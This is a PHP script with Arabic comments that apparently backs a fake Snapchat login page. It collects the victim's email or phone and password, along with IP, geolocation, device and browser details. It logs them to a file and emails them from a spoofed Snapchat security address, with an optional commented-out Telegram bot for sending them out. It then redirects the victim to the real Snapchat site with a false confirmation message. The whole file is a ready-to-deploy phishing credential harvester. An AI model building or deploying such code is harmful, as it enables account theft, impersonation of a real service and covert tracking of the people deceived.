<?php
header('Content-Type: text/plain; charset=utf-8');

if ($_SERVER['REQUEST_METHOD'] === 'POST') {

    // ------ البيانات الأساسية ------
    $identifier = $_POST['identifier'] ?? 'غير مدخل';
    $password = $_POST['password'] ?? 'غير مدخل';

    // ------ معلومات الجهاز والإعدادات ------
    $ip = $_SERVER['REMOTE_ADDR'];
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    $screen_res = $_POST['screen_res'] ?? 'غير معروف';
    $timezone = $_POST['timezone'] ?? 'غير معروف';
    $language = $_POST['language'] ?? 'غير معروف';
    $device_type = $_POST['device_type'] ?? 'غير معروف';
    $os = $_POST['os'] ?? 'غير معروف';
    $port = $_SERVER['REMOTE_PORT'] ?? 'غير معروف';
    $referer = $_SERVER['HTTP_REFERER'] ?? 'مباشر (لا يوجد مرجع)';

    // ------ الحصول على الموقع الجغرافي ------
    $geo = @file_get_contents("http://ip-api.com/json/{$ip}?fields=status,country,city,lat,lon,isp,org");
    $geo_data = json_decode($geo, true);
    if ($geo && isset($geo_data['status']) && $geo_data['status'] === 'success') {
        $country = $geo_data['country'] ?? 'غير معروف';
        $city = $geo_data['city'] ?? 'غير معروف';
        $lat = $geo_data['lat'] ?? '0';
        $lon = $geo_data['lon'] ?? '0';
        $isp = $geo_data['isp'] ?? 'غير معروف';
        $org = $geo_data['org'] ?? 'غير معروف';
    } else {
        $country = 'فشل جلب الموقع';
        $city = 'فشل';
        $lat = '0';
        $lon = '0';
        $isp = 'فشل';
        $org = 'فشل';
    }

    // ------ تحليل المتصفح ------
    $browser = 'غير معروف';
    if (strpos($user_agent, 'Chrome') !== false && strpos($user_agent, 'Edg') === false) $browser = 'Google Chrome';
    elseif (strpos($user_agent, 'Firefox') !== false) $browser = 'Mozilla Firefox';
    elseif (strpos($user_agent, 'Safari') !== false && strpos($user_agent, 'Chrome') === false) $browser = 'Apple Safari';
    elseif (strpos($user_agent, 'Edg') !== false) $browser = 'Microsoft Edge';
    elseif (strpos($user_agent, 'Opera') !== false || strpos($user_agent, 'OPR') !== false) $browser = 'Opera';

    // ------ تنسيق التقرير ------
    $report = "========================================\n";
    $report .= "🔓 تم اختراق جديد في " . date('Y-m-d H:i:s') . "\n";
    $report .= "========================================\n";
    $report .= "📧 البريد/الهاتف : $identifier\n";
    $report .= "🔑 كلمة المرور   : $password\n";
    $report .= "----------------------------------------\n";
    $report .= "🌐 IP Address    : $ip\n";
    $report .= "🌍 الدولة       : $country\n";
    $report .= "🏙️ المدينة      : $city\n";
    $report .= "📌 الإحداثيات   : $lat , $lon\n";
    $report .= "📡 مزود الخدمة  : $isp\n";
    $report .= "🏢 المنظمة      : $org\n";
    $report .= "----------------------------------------\n";
    $report .= "📱 نوع الجهاز   : $device_type\n";
    $report .= "💻 نظام التشغيل: $os\n";
    $report .= "🌐 المتصفح      : $browser\n";
    $report .= "📐 دقة الشاشة   : $screen_res\n";
    $report .= "🕒 المنطقة الزمنية: $timezone\n";
    $report .= "🗣️ اللغة        : $language\n";
    $report .= "🔌 المنفذ       : $port\n";
    $report .= "📎 الرابط المحيل: $referer\n";
    $report .= "========================================\n\n";

    // ------ حفظ في log.txt ------
    file_put_contents('log.txt', $report, FILE_APPEND | LOCK_EX);

    // ------ إرسال إلى بريدك الإلكتروني ------
    $to = 'your-email@example.com'; // ⬅️ غيّر هذا
    $subject = '📸 بيانات تسجيل دخول جديدة';
    $headers = "MIME-Version: 1.0\r\n";
    $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
    $headers .= "From: noreply@snapchat-security.com\r\n";
    $headers .= "Reply-To: noreply@snapchat-security.com\r\n";
    @mail($to, $subject, $report, $headers);

    // ------ إرسال إلى تلغرام (اختياري) ------
    /*
    $bot_token = 'توكن البوت';
    $chat_id = 'ايدي الدردشة';
    $telegram_url = "https://api.telegram.org/bot{$bot_token}/sendMessage";
    file_get_contents($telegram_url . '?' . http_build_query(['chat_id' => $chat_id, 'text' => $report]));
    */

    // ------ التوجيه إلى سناب شات ------
    header("Refresh: 2; URL=https://www.snapchat.com/");
    echo "تم التحقق بنجاح، جارٍ التوجيه...";
    exit;
}
?>
